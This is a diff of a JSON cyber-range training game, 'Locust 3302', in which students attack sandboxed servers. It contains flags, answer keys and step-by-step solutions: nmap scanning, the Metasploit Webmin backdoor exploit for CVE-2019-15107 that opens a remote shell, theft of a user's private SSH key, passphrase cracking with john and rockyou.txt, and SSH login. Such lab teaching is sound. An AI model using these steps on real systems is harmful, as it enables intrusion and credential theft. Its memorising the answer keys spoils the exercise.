@@ -1,429 +1,540 @@
 {
-  "title" : "Locust 3302",
-  "description" : "Infosec community all over the word has been investigating hacker group\nLocust 3302. This mysterious organization has been very active in the\nhacker scene and is believed to be responsible for several cyber-attacks.\nRecently you have acquired an IP address of one of their servers. Find out\nwho they are and what do they do. These criminals have to be stopped!",
-  "prerequisites" : [ ],
-  "outcomes" : [ "You will learn how to scan a server, how to find out possible vulnerabilities and how to exploit them." ],
-  "state" : "UNRELEASED",
-  "show_stepper_bar" : true,
-  "levels" : [ {
-    "title" : "Introduction to Locust 3302",
-    "level_type" : "INFO_LEVEL",
-    "order" : 0,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "content" : "# General information: please read carefully\n\n* The solution of a level **will be required** in the further levels. Do not try to skip ahead. If you reveal a solution to the level, complete all the steps, you will need them later.\n* If you get stuck during the game, feel free to use Google.\n* This game is for educational purposes only.\n\n# Storyline intro\n\nMembers of the infosec community from all over the world have been investigating a mysterious entity that calls itself **Locust 3302**. It is unknown whether it is just one person or a group. Regardless, they have been very active in the hacker scene and they are believed to be responsible for several destructive cyber attacks. \n\nRecently, we have acquired the IP address of one of their servers. We need you to find out who they are, and what their motives are. They are breaking the law and have to be stopped."
-  }, {
-    "title" : "Get Access",
-    "level_type" : "ACCESS_LEVEL",
-    "order" : 1,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "passkey" : "start",
-    "cloud_content" : "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, Submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear. \n2. Login with username **`user`** and password **`Password123`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
-    "local_content" : "This sandbox has not been tested for use with local sandbox."
-  }, {
-    "title" : "Scan the IP address",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 2,
-    "estimated_duration" : 15,
-    "minimal_possible_solve_time" : null,
-    "answer" : "Webmin",
-    "answer_variable_name" : null,
-    "content" : "# Information about your machine\n\nYou control the \"attacker\" machine running [Kali Linux](https://www.kali.org/).\n\nAll the tools you need are already installed.\n\n# The first task assignment\n\nSee if the acquired IP address `172.18.1.5` leads anywhere.\n\n**Flag:** the name of a possibly vulnerable service running on an open port. The flag will be listed in parentheses followed by `httpd`, like this: `(Flag httpd)`.",
-    "solution" : "1. Open the terminal and run the command `nmap -sV 172.18.1.5`\n2. The highest shown port is `10000` running the `Webmin` service -- this is the flag.\n ",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "What tool to use? (less detailed hint)",
-      "content" : "The tool to scan IP addresses is already installed on your attacker machine and is commonly used to scan servers and their services.",
-      "hint_penalty" : 1,
-      "order" : 0
-    }, {
-      "title" : "What tool to use? (more detailed hint)",
-      "content" : "Use **nmap** to scan the server. Type `nmap --help` for some info or `man nmap` for a more comprehensive manual.",
-      "hint_penalty" : 2,
-      "order" : 1
-    }, {
-      "title" : "I found the flag, but the system does not accept it.",
-      "content" : "Be accurate. The letters' case matters. The flag is case-sensitive.",
-      "hint_penalty" : 0,
-      "order" : 3
-    }, {
-      "title" : "Hint for the parameters of the tool",
-      "content" : "Check out in the documentation what the `-sV` option does. If you want to know the details of only a specific service, combine it with the `-p port_number` parameter.",
-      "hint_penalty" : 2,
-      "order" : 2
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 10,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "scanned_ip",
-      "prereq_state" : [ ],
-      "cmd" : "nmap -sV 172.18.1.5",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "nmap -sV 172.18.1.5",
-      "optional" : false
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : " Identify a vulnerability",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 3,
-    "estimated_duration" : 15,
-    "minimal_possible_solve_time" : null,
-    "answer" : "CVE-2019-15107",
-    "answer_variable_name" : null,
-    "content" : "Well done! Now you know what applications are running on the server (`172.18.1.5`). Find out if any of them is vulnerable and choose the right vulnerability to exploit. (Look for a critical vulnerability from the past few years.)\n\nPort 10000 seems to be suspicious!\n\n**Flag:** CVE code of the vulnerability in the format **CVE-Y-X**, where Y is year and X is a 4- or 5-digit number.",
-    "solution" : "In the previous level, you have found that Webmin is running on the port 10000.\n\nThere are several ways to find a vulnerability of Webmin:\n* google \"Webmin exploit\" -- the correct vulnerability is on the first page\n* in terminal, run `searchsploit webmin`\n* open Metasploit console and search for Webmin vulnerabilities\n     ```\n     user@attacker:~# msfconsole\n     msf6 > search webmin\n     ```\n\nThe vulnerability you are looking for is **CVE-2019-15107**. It's unauthenticated and from the past few years.\n\nSee more at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "What to look for and where",
-      "content" : "CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. Each flaw has a unique identifier. See https://cve.mitre.org/\n\nUse [exploit-db.com](https://www.exploit-db.com/) or the Metasploit tool to find CVEs associated with Webmin.\n\nLook for relatively recent, unauthenticated, and critical exploits.",
-      "hint_penalty" : 4,
-      "order" : 1
-    }, {
-      "title" : "How to start",
-      "content" : "Using `nmap` with the `-sV` flag, you can discover (if you haven't already) that **Webmin** is running on the port 10000. However, its CVE code will not be directly in the console with the `nmap` output. So, google the vulnerabilities of Webmin (do not search for the vulnerabilities of port 10000, that number is arbitrary), or use `msfconsole` to find out available exploits for Webmin backdoor vulnerabilities.",
-      "hint_penalty" : 2,
-      "order" : 0
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 15,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "vulnerability_identified",
-      "prereq_state" : [ "metasploit__opened" ],
-      "cmd" : "search webmin",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "search webmin",
-      "optional" : true
-    }, {
-      "state_name" : "metasploit__opened",
-      "prereq_state" : [ "scanned_ip" ],
-      "cmd" : "msfconsole",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "msfconsole",
-      "optional" : true
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : "Exploit the vulnerability",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 4,
-    "estimated_duration" : 10,
-    "minimal_possible_solve_time" : null,
-    "answer" : "25790",
-    "answer_variable_name" : null,
-    "content" : "The vulnerability CVE-2019-15107 seems promising. Exploit it, gain access to the server (`172.18.1.5`), and **stay connected to it**.\n\n**Flag format**: a five-digit number located in a file in the `/root/` directory on the server.\n\nNote: The exploit contains a bug. After you gain access, if the remote shell does not function properly, type `bash`. It will run, although it will appear waiting (just a flashing underscore character).",
-    "solution" : "```\n1. user@attacker:~#  msfconsole\n2. msf6 > search webmin  \n3. msf6 > use exploit/linux/http/webmin_backdoor\n4. msf6 > show options\n5. msf6 > set RHOST 172.18.1.5\n6. msf6 > set RPORT 10000\n7. msf6 > set LHOST 10.10.135.83\n8. msf6 > check\n\nIf Metasploit reports the target as not vulnerable, try to proceed anyway.\n\n9. msf6 > exploit (or run, this is a synonym)\n\nAfter this a new SSH session to the server is created. If the remote shell does not function properly, type `bash`. It will run, although it will appear waiting (just a flashing underscore character), and you can continue with step 10. If it does not work, switch to root using `su root` and continue with step 10.\n\n10. cd /root/\n11. cat WARNING-READ-ME.txt\n```\n\nThe flag is **25790**.",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "Which exploit should I use exactly? (more detailed hint)",
-      "content" : "The name you are looking for is `exploit/unix/webapp/webmin_backdoor`. You can search it by `search webmin` in the Metasploit tool. Use the `use exploit/unix/webapp/webmin_backdoor` command to activate the exploit. Nevertheless, the exploit is still not applied after that. You have to make some additional steps to apply the exploit on the server.",
-      "hint_penalty" : 3,
-      "order" : 3
-    }, {
-      "title" : "How to apply the exploit? (hint for dummies :-)",
-      "content" : "First, use the `use exploit/unix/webapp/webmin_backdoor` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. \n\n* `RHOSTS` needs to be set to the IP address of the victim, i.e., `set RHOSTS 172.18.1.5`.\n* `RPORT` needs to be set to desired port number, i.e., 10000.\n* `LHOST` needs to be set to the machine that initiates the exploit (you), i.e., `set LHOST 10.10.135.83`.\n\nThen run the exploit using the command `exploit` or `run`.",
-      "hint_penalty" : 5,
-      "order" : 6
-    }, {
-      "title" : "How to apply the exploit? (less detailed hint)",
-      "content" : "First, use the `use path-to-exploit` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set before you run it. Type `show options` to display them. Set the remote server IP and your local IP. Then run the exploit using the command `exploit` or `run`.",
-      "hint_penalty" : 1,
-      "order" : 4
-    }, {
-      "title" : "Which file on the server contains the flag?",
-      "content" : "`/root/WARNING-READ-ME.txt`",
-      "hint_penalty" : 1,
-      "order" : 7
-    }, {
-      "title" : "How to apply the exploit? (more detailed hint)",
-      "content" : "First, use the `use path-to-exploit` command to activate the exploit. Then, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. Parameters for this exploit are `RHOSTS` and `LHOST`. Set them to correct values by using `set parameter value`. Then run the exploit using the command `exploit` or `run`.",
-      "hint_penalty" : 3,
-      "order" : 5
-    }, {
-      "title" : "What tool to use?",
-      "content" : "The tool you are looking for is called **Metasploit**. It's a command-line tool. Run it and use a correct exploit.\n\nExploits in Metasploit are ready-made scripts that automatically attack a vulnerability. They save you time during penetration testing: you do not need to program or download custom exploits, but you simply use existing attack scripts that someone created for the common vulnerabilities.\n\nIf you have never heard of Metasploit, check out the tutorial at https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/",
-      "hint_penalty" : 2,
-      "order" : 0
-    }, {
-      "title" : "How to show content of a file?",
-      "content" : "Simply `cat path/to/the/file`",
-      "hint_penalty" : 1,
-      "order" : 8
-    }, {
-      "title" : "Which exploit should I use?  (less detailed hint)",
-      "content" : "The name of the exploit is intuitive. It is a backdoor that includes the name of the service in its name. You can search it easily in the `msfconsole`.",
-      "hint_penalty" : 1,
-      "order" : 2
-    }, {
-      "title" : "How to find the correct exploit?",
-      "content" : "There is a `search` command in Metasploit (msfconsole) to find the correct exploit. Additional flags for the `search` command can be useful!\n\nTo use the exploit, run `use [path of the exploit]`. It is installed in the `exploit/unix` folder.",
-      "hint_penalty" : 2,
-      "order" : 1
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 20,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "check",
-      "prereq_state" : [ "lhost_set", "rhost_set", "rport_set" ],
-      "cmd" : "check",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "check",
-      "optional" : true
-    }, {
-      "state_name" : "options_showed",
-      "prereq_state" : [ "metasploit_opened" ],
-      "cmd" : "show options",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "show options",
-      "optional" : true
-    }, {
-      "state_name" : "rport_set",
-      "prereq_state" : [ "used_webmin_backdoor" ],
-      "cmd" : "set RPORT 10000",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "set RPORT 10000",
-      "optional" : false
-    }, {
-      "state_name" : "used_webmin_backdoor",
-      "prereq_state" : [ "metasploit_opened" ],
-      "cmd" : "use exploit/linux/http/webmin_backdoor",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "use exploit/linux/http/webmin_backdoor",
-      "optional" : false
-    }, {
-      "state_name" : "lhost_set",
-      "prereq_state" : [ "used_webmin_backdoor" ],
-      "cmd" : "set LHOST 10.10.135.83",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "set LHOST 10.10.135.83",
-      "optional" : false
-    }, {
-      "state_name" : "metasploit_opened",
-      "prereq_state" : [ "vulnerability_identified" ],
-      "cmd" : "msfconsole",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "msfconsole",
-      "optional" : false
-    }, {
-      "state_name" : "rhost_set",
-      "prereq_state" : [ "used_webmin_backdoor" ],
-      "cmd" : "set RHOST 172.18.1.5",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "set RHOST 172.18.1.5",
-      "optional" : false
-    }, {
-      "state_name" : "exploited_by_run",
-      "prereq_state" : [ "check" ],
-      "cmd" : "run",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "run",
-      "optional" : true
-    }, {
-      "state_name" : "exploited_by_exploit",
-      "prereq_state" : [ "check" ],
-      "cmd" : "exploit",
-      "cmd_type" : "msf-command",
-      "cmd_regex" : "exploit",
-      "optional" : true
-    }, {
-      "state_name" : "found_hidden_flag",
-      "prereq_state" : [ "exploited_by_run", "exploited_by_exploit" ],
-      "cmd" : "cat /root/WARNING-READ-ME.txt",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "cat .*WARNING-READ-ME.txt",
-      "optional" : false
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : "Find an IP address of the secret server",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 5,
-    "estimated_duration" : 10,
-    "minimal_possible_solve_time" : null,
-    "answer" : "10.1.17.4",
-    "answer_variable_name" : null,
-    "content" : "Locust 3302 anticipated our attack and notified their members. Most of their data seem to have been deleted, but hopefully, there's still something left elsewhere.\n\nFind the IP address of the new server that they moved their files to. We're not giving up just yet!\n\n**Flag:** IP address of the secret server.",
-    "solution" : "```\n1. run ls -a /home/eve on the previously exploited server\n2. display .bash_history file with less .bash_history\n3. scp command is used for copying files to remote server, the IP address is 10.1.17.4\n```",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "Where exactly to look for the flag",
-      "content" : "Try to explore a `.bash_history` file and choose the correct IP address. Don't guess!",
-      "hint_penalty" : 6,
-      "order" : 1
-    }, {
-      "title" : "What remote activity to look for (less detailed hint)",
-      "content" : "What was the criminal advised to do before deleting his files? To *backup* files to the secret server.",
-      "hint_penalty" : 2,
-      "order" : 2
-    }, {
-      "title" : "What remote activity to look for (more detailed hint)",
-      "content" : "What was the criminal advised to do before deleting his files? To *backup* files to the secret server. The `scp` command is often used to copy data remotely.",
-      "hint_penalty" : 3,
-      "order" : 3
-    }, {
-      "title" : "How to start",
-      "content" : "They had to connect to the secret server from this host when they copied the data. Perhaps, some traces of the connection could remain in their homes located at the `/home/` directory.",
-      "hint_penalty" : 4,
-      "order" : 0
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 20,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "found_right_file",
-      "prereq_state" : [ "found_hidden_flag" ],
-      "cmd" : "ls -a /home/eve",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "ls .*eve",
-      "optional" : false
-    }, {
-      "state_name" : "found_ip",
-      "prereq_state" : [ "found_right_file" ],
-      "cmd" : "less .bash_history",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "less|cat .*\\.bash_history",
-      "optional" : false
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : "Access the secret server",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 6,
-    "estimated_duration" : 20,
-    "minimal_possible_solve_time" : null,
-    "answer" : "pinkprincess",
-    "answer_variable_name" : null,
-    "content" : "Very well, we now have the IP of their \"secret\" server (`10.1.17.4`). But how do we get in? It is surely heavily guarded. Don't try to search for vulnerabilities, that would probably be a waste of time. Search for interesting files on the web server (`172.18.1.5`) you previously exploited. There might be something that will help you access the secret server.\n\n**Flag:** the passphrase to a file that allows you to access the secret server.",
-    "solution" : "When Eve was working on the web server, she authenticated to the secret server using an SSH keypair. (Password authentication is turned off.)\n\nThere is a `.ssh` directory with a private SSH key in Eve's directory. Print it on the terminal (`cat /home/eve/.ssh/id_rsa`) and copy it to a local file on your Attacker, so that you can crack it later.\n\nAn alternative way to get the key is to run a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) session (a remote Metasploit shell):\n```\n1. background\n2. msf6 > sessions -u 1\n3. msf6 > sessions -i 2\n4. msf6 > download id_rsa (when in the /home/eve/.ssh folder in the remote shell)\n```\n\nAfter you have the private SSH key, crack its passphrase on the Attacker. Hash the private key using `ssh2john` and crack it with `rockyou.txt` wordlist:  \n1. `user@attacker:~# ssh2john id_rsa > hash`\n2. `user@attacker:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash`\n\nThe passphrase and the flag is **pinkprincess**",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "What to do with the file?  (more detailed hint)",
-      "content" : "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA very popular cracking tool is `john`. Display its manual pages or help for the command. \n\nHowever, `john` needs to convert the private key into a different format before cracking it. Therefore, use the script `ssh2john.py` in the Attacker's `/home/user/` directory for conversion, then the cracking tool `john` with a suitable wordlist (`rockyou.txt`).",
-      "hint_penalty" : 5,
-      "order" : 4
-    }, {
-      "title" : "How to copy the file to the Attacker host?",
-      "content" : "Just copy-and-paste between terminals: Show the content of the key's file in the terminal (i.e., using `cat file`), select and copy the content, switch to the attacker's terminal, open some text editor, paste the content, and finally save and close the editor. Use `nano` editor, for instance.\n\nAn alternative way to get the key is to run a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) session (a remote Metasploit shell):\n```\n1. background\n2. msf6 > sessions -u 1\n3. msf6 > sessions -i 2\n4. msf6 > download id_rsa (when in the /home/eve/.ssh folder in the remote shell)\n```",
-      "hint_penalty" : 3,
-      "order" : 2
-    }, {
-      "title" : "What file to look for?  (more detailed hint)",
-      "content" : "Eve used `scp` to connect to the secret server. `scp` uses an SSH connection to copy files. Look for the private SSH key file in the `/home/eve/.ssh` directory on the web server (`172.18.1.5`).",
-      "hint_penalty" : 3,
-      "order" : 1
-    }, {
-      "title" : "What to do with the file? (less detailed hint)",
-      "content" : "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA brute-force attack would take too long, use a dictionary attack instead. In a dictionary attack, the cracking program automatically tries different passphrases from a textual wordlist.\n\nIf the attack is taking too long, look for different dictionaries that are present on your machine in `/usr/share/wordlists/`.",
-      "hint_penalty" : 3,
-      "order" : 3
-    }, {
-      "title" : "What file to look for?  (less detailed hint)",
-      "content" : "Eve used `scp` to connect to the secret server. `scp` uses an SSH connection to copy files. Try to look for private SSH keys on the web server (`172.18.1.5`).",
-      "hint_penalty" : 2,
-      "order" : 0
-    }, {
-      "title" : "What to do with the file?  (for dummies :-)",
-      "content" : "You cannot use the private SSH key without a passphrase. Use a password-cracking tool on your Attacker to find out that passphrase. Then, you will be able to connect to the secret server.\n\nA very popular cracking tool is `john`. Display its manual pages or help for the command. \n\nHowever, `john` needs to convert the private key into a different format before cracking it. Therefore, use the script `ssh2john.py` in the Attacker's `/home/user/` directory for conversion, then the cracking tool `john` with a suitable wordlist (`rockyou.txt`):\n1. `user@attacker:~# python3 ssh2john.py id_rsa > hash`\n2. `user@attacker:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash`",
-      "hint_penalty" : 6,
-      "order" : 5
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 25,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "use_ssh2john",
-      "prereq_state" : [ "found_ip" ],
-      "cmd" : "ssh2john id_rsa > hash",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : ".*ssh2john .*",
-      "optional" : false
-    }, {
-      "state_name" : "use_john_with_dict",
-      "prereq_state" : [ "use_ssh2john" ],
-      "cmd" : "john --wordlist=/usr/share/wordlists/rockyou.txt",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "john --wordlist=.*rockyou\\.txt .*",
-      "optional" : false
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : "Steal ░░▒░ from the other server",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 7,
-    "estimated_duration" : 10,
-    "minimal_possible_solve_time" : null,
-    "answer" : "58345",
-    "answer_variable_name" : null,
-    "content" : "Conn░ct to the░other server with SSH and your newly cr░cked priv░░e key and look▒aro░nd the file syst▒m.░There must░be som░thi▒g there.\n\n**fLaG: tHE numBeR at the LAst L1ne oOoF tHe ▒░▒▒░ fiLE in THe ~/t░p-s▒░r▒t diREKTory**;\n\n(Note: the messed-up characters are intentional as a part of the story.)",
-    "solution" : "1. `user@attacker:~# chmod 0600 id_rsa`\n2. `user@attacker:~# ssh -i id_rsa eve@10.1.17.4`\n3. `eve@client:~$ cat top-secret/flag.txt`\n\nThe flag is **58345**.\n\n",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "What to do after connecting with SSH",
-      "content" : "Use Eve's private SSH key. You may need to change its permissions.",
-      "hint_penalty" : 4,
-      "order" : 1
-    }, {
-      "title" : "SSH hint",
-      "content" : "Make sure you're connecting as a correct user.",
-      "hint_penalty" : 4,
-      "order" : 0
-    } ],
-    "incorrect_answer_limit" : 10,
-    "attachments" : [ ],
-    "max_score" : 15,
-    "variant_answers" : false,
-    "reference_solution" : [ {
-      "state_name" : "connect",
-      "prereq_state" : [ "change_rights" ],
-      "cmd" : "ssh -i id_rsa eve@10.1.17.4",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "ssh -i .* eve@10.1.17.4",
-      "optional" : false
-    }, {
-      "state_name" : "change_rights",
-      "prereq_state" : [ "use_john_with_dict" ],
-      "cmd" : "chmod 0600 id_rsa",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "chmod .*",
-      "optional" : false
-    }, {
-      "state_name" : "finish",
-      "prereq_state" : [ "connect" ],
-      "cmd" : "cat top-secret/flag.txt",
-      "cmd_type" : "bash-command",
-      "cmd_regex" : "cat .*flag.txt",
-      "optional" : false
-    } ],
-    "mitre_techniques" : [ ],
-    "expected_commands" : [ ],
-    "commands_required" : false
-  }, {
-    "title" : "Congratulations",
-    "level_type" : "INFO_LEVEL",
-    "order" : 8,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "content" : "You have found us, as we wanted you to. We are not what most say. We know things that the top 1% of the top 1% do not want us to know. We need recruits for fighting against them. We have chosen you. \n\nWe are the future. \n\nExpect us to be contacting you soon. \n\n**▒░░░░░░|<0by1k/\\\\░3302░▒** \n\nEpstein did not kill himself.\n\n---\n\nCredits: [storyline inspiration](https://en.wikipedia.org/wiki/Cicada_3301)\n\nMade by students of the *Seminar on Simulation of Cyber Attacks* course in December 2019."
-  } ],
-  "estimated_duration" : 80,
-  "variant_sandboxes" : false
+  "title": "Locust 3302",
+  "description": "Infosec community all over the word has been investigating hacker group\nLocust 3302. This mysterious organization has been very active in the\nhacker scene and is believed to be responsible for several cyber-attacks.\nRecently you have acquired an IP address of one of their servers. Find out\nwho they are and what do they do. These criminals have to be stopped!",
+  "prerequisites": [],
+  "outcomes": [
+    "You will learn how to scan a server, how to find out possible vulnerabilities and how to exploit them."
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Introduction to Locust 3302",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# General information: please read carefully\n\n* The solution of a level **will be required** in the further levels. Do not try to skip ahead. If you reveal a solution to the level, complete all the steps, you will need them later.\n* If you get stuck during the game, feel free to use Google.\n* This game is for educational purposes only.\n\n# Storyline intro\n\nMembers of the infosec community from all over the world have been investigating a mysterious entity that calls itself **Locust 3302**. It is unknown whether it is just one person or a group. Regardless, they have been very active in the hacker scene and they are believed to be responsible for several destructive cyber attacks. \n\nRecently, we have acquired the IP address of one of their servers. We need you to find out who they are, and what their motives are. They are breaking the law and have to be stopped."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, Submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear. \n2. Login with username **`user`** and password **`Password123`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
+      "local_content": "This sandbox has not been tested for use with local sandbox."
+    },
+    {
+      "title": "Scan the IP address",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": "Webmin",
+      "answer_variable_name": null,
+      "content": "# Information about your machine\n\nYou control the \"attacker\" machine running [Kali Linux](https://www.kali.org/).\n\nAll the tools you need are already installed.\n\n# The first task assignment\n\nSee if the acquired IP address `172.18.1.5` leads anywhere.\n\n**Flag:** the name of a possibly vulnerable service running on an open port. The flag will be listed in parentheses followed by `httpd`, like this: `(Flag httpd)`.",
+      "solution": "1. Open the terminal and run the command `nmap -sV 172.18.1.5`\n2. The highest shown port is `10000` running the `Webmin` service -- this is the flag.\n ",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What tool to use? (less detailed hint)",
+          "content": "The tool to scan IP addresses is already installed on your attacker machine and is commonly used to scan servers and their services.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "What tool to use? (more detailed hint)",
+          "content": "Use **nmap** to scan the server. Type `nmap --help` for some info or `man nmap` for a more comprehensive manual.",
+          "hint_penalty": 2,
+          "order": 1
+        },
+        {
+          "title": "I found the flag, but the system does not accept it.",
+          "content": "Be accurate. The letters' case matters. The flag is case-sensitive.",
+          "hint_penalty": 0,
+          "order": 3
+        },
+        {
+          "title": "Hint for the parameters of the tool",
+          "content": "Check out in the documentation what the `-sV` option does. If you want to know the details of only a specific service, combine it with the `-p port_number` parameter.",
+          "hint_penalty": 2,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "scanned_ip",
+          "prereq_state": [],
+          "cmd": "nmap -sV 172.18.1.5",
+          "cmd_type": "bash-command",
+          "cmd_regex": "nmap -sV 172.18.1.5",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": " Identify a vulnerability",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": "CVE-2019-15107",
+      "answer_variable_name": null,
+      "content": "Well done! Now you know what applications are running on the server (`172.18.1.5`). Find out if any of them is vulnerable and choose the right vulnerability to exploit. (Look for a critical vulnerability from the past few years.)\n\nPort 10000 seems to be suspicious!\n\n**Flag:** CVE code of the vulnerability in the format **CVE-Y-X**, where Y is year and X is a 4- or 5-digit number.",
+      "solution": "In the previous level, you have found that Webmin is running on the port 10000.\n\nThere are several ways to find a vulnerability of Webmin:\n* google \"Webmin exploit\" -- the correct vulnerability is on the first page\n* in terminal, run `searchsploit webmin`\n* open Metasploit console and search for Webmin vulnerabilities\n     ```\n     user@attacker:~# msfconsole\n     msf6 > search webmin\n     ```\n\nThe vulnerability you are looking for is **CVE-2019-15107**. It's unauthenticated and from the past few years.\n\nSee more at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What to look for and where",
+          "content": "CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. Each flaw has a unique identifier. See https://cve.mitre.org/\n\nUse [exploit-db.com](https://www.exploit-db.com/) or the Metasploit tool to find CVEs associated with Webmin.\n\nLook for relatively recent, unauthenticated, and critical exploits.",
+          "hint_penalty": 4,
+          "order": 1
+        },
+        {
+          "title": "How to start",
+          "content": "Using `nmap` with the `-sV` flag, you can discover (if you haven't already) that **Webmin** is running on the port 10000. However, its CVE code will not be directly in the console with the `nmap` output. So, google the vulnerabilities of Webmin (do not search for the vulnerabilities of port 10000, that number is arbitrary), or use `msfconsole` to find out available exploits for Webmin backdoor vulnerabilities.",
+          "hint_penalty": 2,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 15,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "vulnerability_identified",
+          "prereq_state": [
+            "metasploit__opened"
+          ],
+          "cmd": "search webmin",
+          "cmd_type": "msf-command",
+          "cmd_regex": "search webmin",
+          "optional": true
+        },
+        {
+          "state_name": "metasploit__opened",
+          "prereq_state": [
+            "scanned_ip"
+          ],
+          "cmd": "msfconsole",
+          "cmd_type": "bash-command",
+          "cmd_regex": "msfconsole",
+          "optional": true
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Exploit the vulnerability",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "25790",
+      "answer_variable_name": null,
